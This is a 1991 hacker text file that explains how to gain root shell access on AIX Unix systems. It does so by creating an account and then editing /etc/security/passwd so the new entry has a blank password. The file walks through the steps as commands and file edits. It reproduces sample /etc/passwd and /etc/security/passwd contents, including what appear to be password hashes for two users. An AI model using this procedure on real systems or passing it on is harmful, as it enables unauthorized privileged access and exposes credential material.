   Subject: Security features in AIX Unix System.
   Date: 07/24/91 6:00pm EST
   Author: Inphiniti

   Comments:  This is a short file that I thought I would release. Since
      the size of the file is not important..


   AIX Unis system difference in several ways from a normal based Unix system.

   AIX has two password files that stores the security information you will
   need to modify to obtain root shell access.

   AIX's   Makusr program is one of the worst I have encountered but it will
   give the avererage hacker some trouble.

   The account you have must have access to the following two directories..

   o - /etc
   o - /etc/security

   The first thing you must do is use the on-line mkuser program to make
   yourself an account. Verify that your account is there by CATing the passwd
   file in the /etc directory.  If you made an account name nha01 then it
   should look like this..

   --   Sample PASSWD file in /ETC directory

root:!:0:0::/:/bin/ksh
daemon:!:1:1::/etc:
bin:!:2:2::/bin:
sys:!:3:3::/usr/sys:
adm:!:4:4::/usr/adm:
uucp:!:5:5::/usr/spool/uucppublic:/usr/lib/uucp/uucico
guest:!:100:100::/usr/guest:
nobody:!:4294967294:4294967294::/:
lpd:!:104:9::/:
nuccp:*:6:0::/u/nuccp:/bin/ksh
LOKI:!:200:1::/u/LOKI:/bin/ksh
demonami:!:7:0::/u/demonami:/bin/ksh
uuad:*:201:1::/u/uuad:/bin/ksh
aa:*:202:1::/u/aa:/bin/ksh
uud:*:8:0::/u/uud:/bin/ksh
uucd:*:9:0::/u/uucd:/bin/ksh
newuser:*:203:1::/u/newuser:/bin/ksh
nha01:!:207:0::/:bin/ksh:/u/nha01

 Now if your account is in there then move on you can move onto step
 two..

 Next change your directory path to cd /etc/security
 type the passwd file in there and this is what it should look like..

   --  Sample PASSWD file from /ETC/SECURITY path

root:
        password =
        lastupdate = 679343225
        flags =

daemon:
        password = *

bin:
        password = *

sys:
        password = *

adm:
        password = *

uucp:
        password = *

guest:
        password = *

nobody:
        password = *

lpd:
        password = *

LOKI:
        password = HfgiGq/guu9Uw
        lastupdate = 676654818
        flags =

demonami:
        password = BerG7SxkTKd/6
        lastupdate = 676654977
        flags =



  Now run edit the passwd file

  # edit passwd
  hit the number of the last line at the : prompt
  then add your new record this way..

username:
        password =
        lastupdate = 676654977
        flags =

   Note that the password, lastupdate, flags fields must be under each other
   as they are in the orginal passwd file.

   Leave the password and flags fields blank and you now have an account
   on AIX Unix..


    I hope this short file helps some of the unix hackers out there.  Most
   of whom I have talked two have had trouble getting root access for another
   account on AIX Unix based systems.. It worked on mine so I thought I'd
   share it with the public.
